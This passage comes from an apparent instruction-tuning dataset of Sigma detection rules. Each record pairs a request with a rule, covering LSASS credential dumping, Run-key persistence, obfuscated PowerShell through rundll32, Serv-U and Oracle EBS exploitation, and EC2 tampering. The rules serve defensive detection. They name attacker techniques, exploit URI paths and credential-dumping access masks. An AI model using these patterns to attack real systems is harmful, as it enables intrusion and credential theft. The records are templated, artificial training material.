filter_*\nfields:\n    - ComputerName\n    - User\n    - SourceImage\nfalsepositives:\n    - Likely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|startswith:\n            - '0x40'\n            # - '0x1000'  # minimum access requirements to query basic info from service\n            # - '0x1400'\n            - '0x100000'\n            - '0x1410'    # car.2019-04-004\n            # - '0x1010'    # car.2019-04-004\n            - '0x1438'    # car.2019-04-004\n            - '0x143a'    # car.2019-04-004\n            - '0x1418'    # car.2019-04-004\n            - '0x1f0fff'\n            - '0x1f1fff'\n            - '0x1f2fff'\n            - '0x1f3fff'\n    filter_exact:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Windows\\System32\\perfmon.exe'\n    filter_generic:\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n    filter_defender:\n        SourceImage|startswith:\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n            - 'C:\\Program Files\\Windows Defender\\'\n            - 'C:\\Program Files\\Microsoft Security Client\\MsMpEng.exe' # Windows7\n        SourceImage|endswith: '\\MsMpEng.exe'\n    filter_defender_updates:\n        SourceImage: 'C:\\Windows\\System32\\svchost.exe'\n        CallTrace|contains|all:\n            - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n            - '}\\mpengine.dll+'\n        GrantedAccess: '0x1418'\n    filter_defender_calltrace:\n        CallTrace|contains:\n            - '|c:\\program files\\windows defender\\mprtp.dll'\n            - '|c:\\program files\\windows defender\\MpClient.dll'\n    filter_gaming_services:\n        SourceImage|startswith: 'C:\\Program Files\\WindowsApps\\'\n        SourceImage|endswith: '\\GamingServices.exe'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n    filter_specific_granted_access_1:\n        SourceImage|endswith:\n            - '\\PROCEXP64.EXE'\n            - '\\PROCEXP.EXE'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - '\\MBAMInstallerService.exe'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n            - '0x40'\n    filter_specific_granted_access_2:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe'\n            - 'C:\\Windows\\syswow64\\MsiExec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n            - '0x1f1fff'\n            - '0x1f3fff'\n    filter_specific_granted_access_3:\n        SourceImage:\n            - 'C:\\Windows\\system32\\wininit.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n        GrantedAccess: '0x1000000'\n    filter_vmwaretools:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    filter_svchost:\n        SourceImage: 'C:\\WINDOWS\\system32\\svchost.exe'\n        GrantedAccess:\n            - '0x100000'\n            - '0x1410'\n    filter_nextron:\n        SourceImage|endswith:\n            - '\\thor.exe'\n            - '\\thor64.exe'\n            - '\\aurora-agent.exe'\n            - '\\aurora-agent-64.exe'\n        GrantedAccess:\n            - '0x40'\n            - '0x1010'\n    filter_explorer:\n        SourceImage|endswith: '\\explorer.exe'\n        GrantedAccess: '0x401'\n    filter_mrt:\n        SourceImage: 'C:\\Windows\\system32\\MRT.exe' # Windows Malicious Software Removal Tool\n        GrantedAccess:\n            - '0x1410'\n            - '0x1418'\n    filter_handle:\n        GrantedAccess: '0x40'\n        SourceImage|endswith:\n            - '\\handle.exe'\n            - '\\handle64.exe'\n    filter_edge: # version in path 96.0.1054.43\n        SourceImage|startswith: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\'\n        SourceImage|endswith: '\\Installer\\setup.exe'\n    filter_webex:\n        SourceImage|endswith: '\\AppData\\Local\\WebEx\\WebexHost.exe'\n        GrantedAccess: '0x401'\n    filter_malwarebytes:\n        SourceImage: 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n        GrantedAccess: '0x1410'\n    filter_dropbox:\n        SourceImage|contains:\n            - ':\\Windows\\Temp\\'\n            - '\\AppData\\Local\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_msbuild:\n        # This FP was generated while building CPython from source and could be related to other similar examples.\n        # But if you don't do that kind of stuff consider removing it from the rule ;)\n        SourceImage|startswith: 'C:\\Program Files\\Microsoft Visual Studio\\'\n        SourceImage|endswith: '\\MSBuild\\Current\\Bin\\MSBuild.exe'\n        GrantedAccess: '0x1F3FFF'\n    # Old - too broad filter\n        # SourceImage|endswith: # easy to bypass. need to implement supportive rule to detect bypass attempts\n        #     - '\\wmiprvse.exe'\n        #     - '\\taskmgr.exe'\n        #     - '\\procexp64.exe'\n        #     - '\\procexp.exe'\n        #     - '\\lsm.exe'\n        #     - '\\MsMpEng.exe'\n        #     - '\\csrss.exe'\n        #     - '\\wininit.exe'\n        #     - '\\vmtoolsd.exe'\n    filter_games:\n        SourceImage|contains: '\\SteamLibrary\\steamapps\\'\n    condition: selection and not 1 of filter_*\nfields:\n    - ComputerName\n    - User\n    - SourceImage\nfalsepositives:\n    - Likely\nlevel: high\n",
      "question": "processes requesting access to LSASS memory via suspicious access masks. This is typical for credentials dumping tools",
      "answer": "In order to detect processes requesting access to LSASS memory via suspicious access masks, which is typical for credentials dumping tools, you should: Monitor Windows processes for any attempts to access the LSASS.exe (Local Security Authority Subsystem Service) executable with specific access permissions that are unusual and indicative of malicious intent. Specifically, look out for processes that end with attempting to interact with LSASS.exe using access rights like '0x40', '0x100000', '0x1410', '0x1438', '0x143a', '0x1418', '0x1f0fff', '0x1f1fff', '0x1f2fff', and '0x1f3fff'. These access rights reflect different levels of permission requests, which in the context of LSASS.exe, are often related to credential dumping or other unauthorized information gathering actions.\n\nExclude legitimate system and monitoring tools that might require access to LSASS for non-malicious purposes. This includes filtering out processes like task manager, performance monitor, certain Windows Defender processes, VMware tools, and several others known to legitimately access LSASS.exe for system management or security purposes. Also, consider exclusions for processes related to gaming services, Microsoft Edge installer, WebEx host, Malwarebytes update, Dropbox update, and the MSBuild process as these might legitimately request access to LSASS but are unlikely to be used for credentials dumping.\n\nPay attention to potential false positives, as legitimate software might occasionally need to access LSASS in a manner similar to credential dumping tools, thus requiring a high level of scrutiny and potentially leading to a likely chance of false-positive detections."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious command line reg.exe tool adding key to RUN key in Registry.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious command line reg.exe tool adding key to RUN key in Registry, you should monitor Windows process creation logs for instances when the command line includes the 'reg' command specifically adding entries to the 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' registry path. This is often indicative of an attempt to achieve persistence by ensuring a malicious program runs each time the system starts. It is important to be aware that there are legitimate reasons for software or administrators to add keys to this registry location, such as during software installation or for legitimate administrative tasks. Moreover, popular applications like Discord might also perform similar actions, which are considered benign. The detection should be viewed with medium severity, balancing vigilance with awareness of potential legitimate use cases.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg'\n            - ' ADD '\n            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg'\n            - ' ADD '\n            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n",
      "question": "suspicious command line reg.exe tool adding key to RUN key in Registry",
      "answer": "In order to detect suspicious command line reg.exe tool adding key to RUN key in Registry, you should monitor Windows process creation logs for instances when the command line includes the 'reg' command specifically adding entries to the 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' registry path. This is often indicative of an attempt to achieve persistence by ensuring a malicious program runs each time the system starts. It is important to be aware that there are legitimate reasons for software or administrators to add keys to this registry location, such as during software installation or for legitimate administrative tasks. Moreover, popular applications like Discord might also perform similar actions, which are considered benign. The detection should be viewed with medium severity, balancing vigilance with awareness of potential legitimate use cases."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting failed installation of a Exchange Transport Agent.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a failed installation of an Exchange Transport Agent, you should monitor the Microsoft Exchange Management service on Windows systems. Focus on identifying specific event logs that record EventID 6 in conjunction with data containing the term 'Install-TransportAgent'. This combination of factors points to an attempt to install a Transport Agent, which is a component used to extend the capabilities of the Exchange server's transport rules. \n\nIt's essential to review the 'AssemblyPath' field within these event logs, as it provides crucial details regarding the installation's context. This information can help differentiate between legitimate attempts to install TransportAgents and potentially malicious activities. However, be aware that legitimate installations of exchange TransportAgents also trigger these logs, and the 'AssemblyPath' can serve as a good indicator to distinguish such benign activities from suspicious ones. \n\nGiven the nature of this detection, it falls under a high severity level due to the potential implications of unauthorized or failed Transport Agent installations, which could impact mail flow or introduce vulnerabilities within the Exchange environment. \n\nTherefore, keeping a vigilant eye on logs tagged with these specific criteria can aid in identifying potentially compromised or misconfigured installations, aligning with the overall cybersecurity strategy to protect exchange servers from misuse or attack.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: msexchange-management\n    product: windows\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        EventID: 6\n        Data|contains: 'Install-TransportAgent'\n    condition: selection\nfields:\n    - AssemblyPath\nfalsepositives:\n    - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: msexchange-management\n    product: windows\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        EventID: 6\n        Data|contains: 'Install-TransportAgent'\n    condition: selection\nfields:\n    - AssemblyPath\nfalsepositives:\n    - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this.\nlevel: high\n",
      "question": "failed installation of a Exchange Transport Agent",
      "answer": "In order to detect a failed installation of an Exchange Transport Agent, you should monitor the Microsoft Exchange Management service on Windows systems. Focus on identifying specific event logs that record EventID 6 in conjunction with data containing the term 'Install-TransportAgent'. This combination of factors points to an attempt to install a Transport Agent, which is a component used to extend the capabilities of the Exchange server's transport rules. \n\nIt's essential to review the 'AssemblyPath' field within these event logs, as it provides crucial details regarding the installation's context. This information can help differentiate between legitimate attempts to install TransportAgents and potentially malicious activities. However, be aware that legitimate installations of exchange TransportAgents also trigger these logs, and the 'AssemblyPath' can serve as a good indicator to distinguish such benign activities from suspicious ones. \n\nGiven the nature of this detection, it falls under a high severity level due to the potential implications of unauthorized or failed Transport Agent installations, which could impact mail flow or introduce vulnerabilities within the Exchange environment. \n\nTherefore, keeping a vigilant eye on logs tagged with these specific criteria can aid in identifying potentially compromised or misconfigured installations, aligning with the overall cybersecurity strategy to protect exchange servers from misuse or attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels\nEnsure that an encryption is used for all sensitive information in transit.\nEnsure that an encrypted channels is used for all administrative account access.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels, ensure that encryption is used for all sensitive information in transit, and ensure that an encrypted channel is used for all administrative account access, you should monitor network flow logs for traffic to specific ports which are commonly associated with unencrypted or potentially insecure communications. These ports include 8080, 21 (FTP), 80 (HTTP), 23 (Telnet), 50000, 1521 (Oracle database), 27017 (MongoDB), 1433 (Microsoft SQL Server), 11211 (Memcached), 3306 (MySQL), 15672 (RabbitMQ), and VNC ports 5900 to 5904. Communications to these ports might indicate that sensitive or administrative data is being transmitted without encryption, which could lead to exposure of confidential information. Be aware that there might be false positive detections, signifying legitimate use of these ports under certain circumstances. Nonetheless, it is critical to treat any activity detected on these ports with scrutiny to maintain the security and integrity of data in transit.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: netflow\ndetection:\n    selection:\n        destination.port:\n            - 8080\n            - 21\n            - 80\n            - 23\n            - 50000\n            - 1521\n            - 27017\n            - 1433\n            - 11211\n            - 3306\n            - 15672\n            - 5900\n            - 5901\n            - 5902\n            - 5903\n            - 5904\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: netflow\ndetection:\n    selection:\n        destination.port:\n            - 8080\n            - 21\n            - 80\n            - 23\n            - 50000\n            - 1521\n            - 27017\n            - 1433\n            - 11211\n            - 3306\n            - 15672\n            - 5900\n            - 5901\n            - 5902\n            - 5903\n            - 5904\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels\nEnsure that an encryption is used for all sensitive information in transit.\nEnsure that an encrypted channels is used for all administrative account access.\n",
      "answer": "In order to ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels, ensure that encryption is used for all sensitive information in transit, and ensure that an encrypted channel is used for all administrative account access, you should monitor network flow logs for traffic to specific ports which are commonly associated with unencrypted or potentially insecure communications. These ports include 8080, 21 (FTP), 80 (HTTP), 23 (Telnet), 50000, 1521 (Oracle database), 27017 (MongoDB), 1433 (Microsoft SQL Server), 11211 (Memcached), 3306 (MySQL), 15672 (RabbitMQ), and VNC ports 5900 to 5904. Communications to these ports might indicate that sensitive or administrative data is being transmitted without encryption, which could lead to exposure of confidential information. Be aware that there might be false positive detections, signifying legitimate use of these ports under certain circumstances. Nonetheless, it is critical to treat any activity detected on these ports with scrutiny to maintain the security and integrity of data in transit."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via use Rundll32 in Scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated PowerShell via the use of Rundll32 in scripts, you should monitor Windows PowerShell module logs for specific patterns that indicate potential suspicious activity. Focus on events with payload content that includes a combination of '&&', 'rundll32', 'shell32.dll', and 'shellexec_rundll'. These elements in conjunction with either of 'value', 'invoke', 'comspec', or 'iex' within the payload suggest an attempt to obscure the true nature of the PowerShell script's actions, which often involves invoking rundll32 to execute malicious code indirectly. This method of script obfuscation is a sophisticated technique used to evade detection by hiding the true intent of the PowerShell script, making it crucial to identify these patterns to mitigate possible threats. The detection of such activity is associated with high severity due to the potential for malicious actions being executed through obscure and indirect methods. Keep in mind that while this detection strategy is essential, false positives are unknown, indicating the necessity for manual verification of detected incidents to confirm their malicious nature.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains|all:\n            - '&&'\n            - 'rundll32'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n        Payload|contains:\n            - 'value'\n            - 'invoke'\n            - 'comspec'\n            - 'iex'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains|all:\n            - '&&'\n            - 'rundll32'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n        Payload|contains:\n            - 'value'\n            - 'invoke'\n            - 'comspec'\n            - 'iex'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via use Rundll32 in Scripts",
      "answer": "In order to detect obfuscated PowerShell via the use of Rundll32 in scripts, you should monitor Windows PowerShell module logs for specific patterns that indicate potential suspicious activity. Focus on events with payload content that includes a combination of '&&', 'rundll32', 'shell32.dll', and 'shellexec_rundll'. These elements in conjunction with either of 'value', 'invoke', 'comspec', or 'iex' within the payload suggest an attempt to obscure the true nature of the PowerShell script's actions, which often involves invoking rundll32 to execute malicious code indirectly. This method of script obfuscation is a sophisticated technique used to evade detection by hiding the true intent of the PowerShell script, making it crucial to identify these patterns to mitigate possible threats. The detection of such activity is associated with high severity due to the potential for malicious actions being executed through obscure and indirect methods. Keep in mind that while this detection strategy is essential, false positives are unknown, indicating the necessity for manual verification of detected incidents to confirm their malicious nature."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322, you should: Monitor Windows process creation logs for specific command-line activities that indicate an exploitation attempt. Specifically, look for the execution of the `whoami` command, which is commonly used by attackers to check the privileges of the compromised account. Additionally, pay attention to commands that access paths related to `./Client/Common/` or `.\\Client\\Common\\`, and the specific use of a batch file located at `C:\\Windows\\Temp\\Serv-U.bat`. These patterns of command line activity are critical indicators of an ongoing exploitation attempt of the Serv-U vulnerability by the identified threat group. False positives are considered unlikely for this detection, underscoring the critical nature of these indicators in identifying potential breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_whoami:\n        CommandLine|contains: 'whoami'\n    selection_cmd_1:\n        CommandLine|contains:\n            - './Client/Common/'\n            - '.\\Client\\Common\\'\n    selection_cmd_2:\n        CommandLine|contains: 'C:\\Windows\\Temp\\Serv-U.bat'\n    condition: selection_whoami and 1 of selection_cmd*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_whoami:\n        CommandLine|contains: 'whoami'\n    selection_cmd_1:\n        CommandLine|contains:\n            - './Client/Common/'\n            - '.\\Client\\Common\\'\n    selection_cmd_2:\n        CommandLine|contains: 'C:\\Windows\\Temp\\Serv-U.bat'\n    condition: selection_whoami and 1 of selection_cmd*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322",
      "answer": "In order to detect patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322, you should: Monitor Windows process creation logs for specific command-line activities that indicate an exploitation attempt. Specifically, look for the execution of the `whoami` command, which is commonly used by attackers to check the privileges of the compromised account. Additionally, pay attention to commands that access paths related to `./Client/Common/` or `.\\Client\\Common\\`, and the specific use of a batch file located at `C:\\Windows\\Temp\\Serv-U.bat`. These patterns of command line activity are critical indicators of an ongoing exploitation attempt of the Serv-U vulnerability by the identified threat group. False positives are considered unlikely for this detection, underscoring the critical nature of these indicators in identifying potential breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential exploitation attempts of CVE-2022-21587 an arbitrary file upload vulnerability impacting Oracle E-Business Suite (EBS). CVE-2022-21587 can lead to unauthenticated remote code execution..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential exploitation attempts of CVE-2022-21587, an arbitrary file upload vulnerability impacting Oracle E-Business Suite (EBS) which can lead to unauthenticated remote code execution, you should monitor your web server logs for POST requests to the Oracle E-Business Suite application, specifically looking for queries containing '/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE', '/OA_HTML/BneUploaderService?bne:uueupload=TRUE', '/OA_HTML/BneDownloadService?bne:uueupload=TRUE', or '/OA_HTML/BneOfflineLOVService?bne:uueupload=TRUE'. These requests are indicative of attempts to exploit the vulnerability by uploading files arbitrarily, which could lead to unauthenticated remote code execution. It is important to log the source IP address of these requests to track the potential attacker. However, be aware that vulnerability scanners might also trigger these indicators, which are considered false positives. The severity of this type of activity is high, indicating a critical need to investigate and respond to such detections promptly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'POST'\n        cs-uri-query|contains:\n            - '/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE'\n            - '/OA_HTML/BneUploaderService?bne:uueupload=TRUE'\n            - '/OA_HTML/BneDownloadService?bne:uueupload=TRUE'\n            - '/OA_HTML/BneOfflineLOVService?bne:uueupload=TRUE'\n    condition: selection\nfields:\n    - src_ip\nfalsepositives:\n    - Vulnerability Scanners\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'POST'\n        cs-uri-query|contains:\n            - '/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE'\n            - '/OA_HTML/BneUploaderService?bne:uueupload=TRUE'\n            - '/OA_HTML/BneDownloadService?bne:uueupload=TRUE'\n            - '/OA_HTML/BneOfflineLOVService?bne:uueupload=TRUE'\n    condition: selection\nfields:\n    - src_ip\nfalsepositives:\n    - Vulnerability Scanners\nlevel: high\n",
      "question": "potential exploitation attempts of CVE-2022-21587 an arbitrary file upload vulnerability impacting Oracle E-Business Suite (EBS). CVE-2022-21587 can lead to unauthenticated remote code execution.",
      "answer": "In order to detect potential exploitation attempts of CVE-2022-21587, an arbitrary file upload vulnerability impacting Oracle E-Business Suite (EBS) which can lead to unauthenticated remote code execution, you should monitor your web server logs for POST requests to the Oracle E-Business Suite application, specifically looking for queries containing '/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE', '/OA_HTML/BneUploaderService?bne:uueupload=TRUE', '/OA_HTML/BneDownloadService?bne:uueupload=TRUE', or '/OA_HTML/BneOfflineLOVService?bne:uueupload=TRUE'. These requests are indicative of attempts to exploit the vulnerability by uploading files arbitrarily, which could lead to unauthenticated remote code execution. It is important to log the source IP address of these requests to track the potential attacker. However, be aware that vulnerability scanners might also trigger these indicators, which are considered false positives. The severity of this type of activity is high, indicating a critical need to investigate and respond to such detections promptly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of an EC2 snapshot's permissions to enable access from another account.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the modification of an EC2 snapshot's permissions to enable access from another account, you should: Monitor AWS CloudTrail logs for events where the source is EC2 (`ec2.amazonaws.com`) and the event name is `ModifySnapshotAttribute`. This activity might indicate that an EC2 snapshot's permissions are being changed to allow access from an external account, which can be a sign of unauthorized access or data exfiltration. Be aware that there can be legitimate reasons for altering a snapshot's permissions, such as granting access to a snapshot for collaboration purposes or transferring resources between accounts. Therefore, it's important to examine these events in the context of known and expected administrative activities to differentiate between benign and malicious intent. The severity level for this activity is considered medium, emphasizing the need for a balanced approach to monitoring and response.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: ec2.amazonaws.com\n        eventName: ModifySnapshotAttribute\n    condition: selection_source\nfalsepositives:\n    - Valid change to a snapshot's permissions\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: ec2.amazonaws.com\n        eventName: ModifySnapshotAttribute\n    condition: selection_source\nfalsepositives:\n    - Valid change to a snapshot's permissions\nlevel: medium\n",
      "question": "modification of an EC2 snapshot's permissions to enable access from another account",
      "answer": "In order to detect the modification of an EC2 snapshot's permissions to enable access from another account, you should: Monitor AWS CloudTrail logs for events where the source is EC2 (`ec2.amazonaws.com`) and the event name is `ModifySnapshotAttribute`. This activity might indicate that an EC2 snapshot's permissions are being changed to allow access from an external account, which can be a sign of unauthorized access or data exfiltration. Be aware that there can be legitimate reasons for altering a snapshot's permissions, such as granting access to a snapshot for collaboration purposes or transferring resources between accounts. Therefore, it's important to examine these events in the context of known and expected administrative activities to differentiate between benign and malicious intent. The severity level for this activity is considered medium, emphasizing the need for a balanced approach to monitoring and response."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the EC2 instance startup script, which will be executed as root/SYSTEM every time the specific instances are booted up, you should: Monitor AWS CloudTrail logs for any event related to modifying an EC2 instance's attributes, specifically focusing on changes made to the `userData` field, which is used to manage the instance's startup script. Key indicators of this activity include logs from the `ec2.amazonaws.com` event source where the `eventName` is `ModifyInstanceAttribute`, and the modification is regarding the `userData` attribute. Be aware that legitimate alterations to the startup script could also trigger an alert, such as valid changes during regular maintenance or updates. This kind of monitoring is critical as it pertains to detecting potential unauthorized modifications, aimed at persisting malicious activities within cloud environments. Such activities are highlighted due to their potential impact and the high level of access that modifications to the startup scripts can provide to an attacker, running with root or SYSTEM privileges every time the instance is initiated.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: ec2.amazonaws.com\n        requestParameters.attribute: 'userData'\n        eventName: ModifyInstanceAttribute\n    condition: selection_source\nfalsepositives:\n    - Valid changes to the startup script\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: ec2.amazonaws.com\n        requestParameters.attribute: 'userData'\n        eventName: ModifyInstanceAttribute\n    condition: selection_source\nfalsepositives:\n    - Valid changes to the startup script\nlevel: high\n",
      "question": "changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up.",
      "answer": "In order to detect changes to the EC2 instance startup script, which will be executed as root/SYSTEM every time the specific instances are booted up, you should: Monitor AWS CloudTrail logs for any event related to modifying an EC2 instance's attributes, specifically focusing on changes made to the `userData` field, which is used to manage the instance's startup script. Key indicators of this activity include logs from the `ec2.amazonaws.com` event source where the `eventName` is `ModifyInstanceAttribute`, and the modification is regarding the `userData` attribute. Be aware that legitimate alterations to the startup script could also trigger an alert, such as valid changes during regular maintenance or updates. This kind of monitoring is critical as it pertains to detecting potential unauthorized modifications, aimed at persisting malicious activities within cloud environments. Such activities are highlighted due to their potential impact and the high level of access that modifications to the startup scripts can provide to an attacker, running with root or SYSTEM privileges every time the instance is initiated."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Rule to detect the Hybrid Connection Manager service running on an endpoint..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the Hybrid Connection Manager service running on an endpoint, you should monitor the Windows Microsoft Service Bus Client logs for specific event IDs and keywords that indicate unauthorized or suspicious activity. Look for logs with event IDs 40300, 40301, and 40302. These event IDs are critical in identifying potential misuse or unauthorized configuration changes in the Hybrid Connection Manager service. Additionally, pay attention to entries containing specific keywords such as 'HybridConnection', 'sb://', 'servicebus.windows.net', and 'HybridConnectionManage'. These keywords are associated with the configuration and management of Hybrid Connections, which could indicate an attempt to manipulate connection settings or unauthorized access to the service. \n\nIt is important to consider the context in which these logs appear. The presence of these event IDs and keywords does not necessarily imply malicious activity. Legitimate use of Hybrid Connection Manager via Azure function apps could generate similar logs. Therefore, any detection should be contextualized, and further investigation is warranted to determine if the activity is indeed unauthorized or malicious. The significance of monitoring these logs lies in the ability to quickly identify and respond to unauthorized access or configuration changes, which are critical for maintaining the security and integrity of the service. These monitoring practices are aligned with several cyber-security frameworks and protocols designed to protect against unauthorized access and potential data breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: microsoft-servicebus-client\ndetection:\n    selection:\n        EventID:\n            - 40300\n            - 40301\n            - 40302\n    keywords:\n        - 'HybridConnection'\n        - 'sb://'\n        - 'servicebus.windows.net'\n        - 'HybridConnectionManage'\n    condition: selection and keywords\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: microsoft-servicebus-client\ndetection:\n    selection:\n        EventID:\n            - 40300\n            - 40301\n            - 40302\n    keywords:\n        - 'HybridConnection'\n        - 'sb://'\n        - 'servicebus.windows.net'\n        - 'HybridConnectionManage'\n    condition: selection and keywords\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
      "question": "Rule to detect the Hybrid Connection Manager service running on an endpoint.",
